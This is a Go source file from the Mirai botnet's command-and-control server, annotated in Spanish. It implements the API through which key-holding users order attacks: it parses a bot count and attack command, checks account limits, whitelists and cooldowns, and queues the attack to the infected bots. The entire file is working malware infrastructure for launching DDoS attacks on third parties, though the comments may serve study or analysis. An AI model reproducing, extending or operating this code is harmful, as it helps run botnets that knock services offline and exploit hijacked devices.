/**
 * @file api.go
 * @brief Implementación de la API del servidor CNC de Mirai
 *
 * Este archivo implementa una interfaz API simple para el servidor de Comando y Control,
 * permitiendo el control programático del botnet a través de comandos basados en texto.
 * La API utiliza un formato de comando simple basado en pipes (|) y proporciona
 * respuestas en formato de texto plano.
 */

package main

import (
	"net"
	"strconv"
	"strings"
	"time"
)

/**
 * Api representa una sesión de conexión API activa
 * Proporciona una interfaz simplificada para control remoto del botnet
 */
type Api struct {
	conn net.Conn // Conexión de red con el cliente API
}

/**
 * NewApi crea una nueva instancia de manejador de API
 *
 * @param conn Conexión de red establecida con el cliente
 * @return Puntero a la nueva instancia de Api
 */
func NewApi(conn net.Conn) *Api {
	return &Api{conn}
}

/**
 * Handle procesa una única solicitud API
 *
 * Este método maneja el protocolo API completo:
 * 1. Lee y valida el comando API (formato: "apikey|comando")
 * 2. Verifica la clave API y obtiene información del usuario
 * 3. Procesa parámetros especiales (conteo de bots)
 * 4. Construye y valida el comando de ataque
 * 5. Ejecuta el ataque si todas las validaciones son exitosas
 *
 * Formato de respuesta:
 * - Error: "ERR|mensaje\r\n"
 * - Éxito: "OK\r\n"
 */
func (this *Api) Handle() {
	var botCount int         // Número de bots a utilizar
	var apiKeyValid bool     // Indicador de validez de la clave API
	var userInfo AccountInfo // Información del usuario

	// Leer el comando del cliente
	// Establece timeout de 60 segundos para la operación
	this.conn.SetDeadline(time.Now().Add(60 * time.Second))

	// Lee el comando del cliente
	cmd, err := this.ReadLine()
	if err != nil {
		this.conn.Write([]byte("ERR|Failed reading line\r\n"))
		return
	}

	// Separa la clave API del comando (formato: "apikey|comando")
	passwordSplit := strings.SplitN(cmd, "|", 2)
	// Verifica la clave API y obtiene información del usuario
	if apiKeyValid, userInfo = database.CheckApiCode(passwordSplit[0]); !apiKeyValid {
		this.conn.Write([]byte("ERR|API code invalid\r\n"))
		return
	}

	// Por defecto, usa el máximo de bots permitidos para el usuario
	botCount = userInfo.maxBots
	// Extrae el comando real después del separador
	cmd = passwordSplit[1]
	// Procesa el número específico de bots si se proporciona (formato: -N comando)
	if cmd[0] == '-' {
		// Divide el comando en conteo y comando real
		countSplit := strings.SplitN(cmd, " ", 2)
		// Extrae el número después del guión
		count := countSplit[0][1:]
		// Convierte el conteo de bots a número
		botCount, err = strconv.Atoi(count)
		if err != nil {
			// Error al parsear el número de bots
			this.conn.Write([]byte("ERR|Failed parsing botcount\r\n"))
			return
		}
		// Verifica que no exceda el límite del usuario
		if userInfo.maxBots != -1 && botCount > userInfo.maxBots {
			this.conn.Write([]byte("ERR|Specified bot count over limit\r\n"))
			return
		}
		// Actualiza el comando sin el prefijo de conteo
		cmd = countSplit[1]
	}

	// Intenta crear un nuevo ataque con el comando proporcionado
	atk, err := NewAttack(cmd, userInfo.admin)
	if err != nil {
		// Error al parsear el comando de ataque
		this.conn.Write([]byte("ERR|Failed parsing attack command\r\n"))
		return
	}

	// Construye el buffer del ataque para enviar a los bots
	buf, err := atk.Build()
	if err != nil {
		// Error al construir el paquete de ataque
		this.conn.Write([]byte("ERR|An unknown error occurred\r\n"))
		return
	}

	// Verifica que el objetivo no esté en la lista blanca
	if database.ContainsWhitelistedTargets(atk) {
		this.conn.Write([]byte("ERR|Attack targetting whitelisted target\r\n"))
		return
	}

	// Verifica si el usuario puede lanzar el ataque (cooldown, límites, etc)
	if can, _ := database.CanLaunchAttack(userInfo.username, atk.Duration, cmd, botCount, 1); !can {
		this.conn.Write([]byte("ERR|Attack cannot be launched\r\n"))
		return
	}

	// Encola el ataque para su ejecución por los bots
	clientList.QueueBuf(buf, botCount, "")
	// Envía confirmación de éxito
	this.conn.Write([]byte("OK\r\n"))
}

/**
 * ReadLine lee una línea completa de la conexión API
 *
 * Esta función implementa una lectura simplificada de línea que:
 * - Ignora caracteres especiales como \r, \t
 * - Detecta fin de línea con \n o \x00
 * - Maneja buffers de hasta 1024 bytes
 *
 * A diferencia de la versión admin, esta implementación es más simple
 * ya que no necesita manejar entrada interactiva ni caracteres de control.
 *
 * @return La línea leída y error en caso de fallo en la lectura
 */
func (this *Api) ReadLine() (string, error) {
	// Buffer para almacenar la línea de entrada
	buf := make([]byte, 1024)
	// Posición actual en el buffer
	bufPos := 0

	for {
		// Lee un byte a la vez
		n, err := this.conn.Read(buf[bufPos : bufPos+1])
		if err != nil || n != 1 {
			// Error de lectura o conexión cerrada
			return "", err
		}

		// Procesa el carácter leído
		if buf[bufPos] == '\r' || buf[bufPos] == '\t' || buf[bufPos] == '\x09' {
			// Ignora caracteres de control común
			bufPos--
		} else if buf[bufPos] == '\n' || buf[bufPos] == '\x00' {
			// Fin de línea encontrado
			return string(buf[:bufPos]), nil
		}
		bufPos++
	}
	return string(buf), nil
}
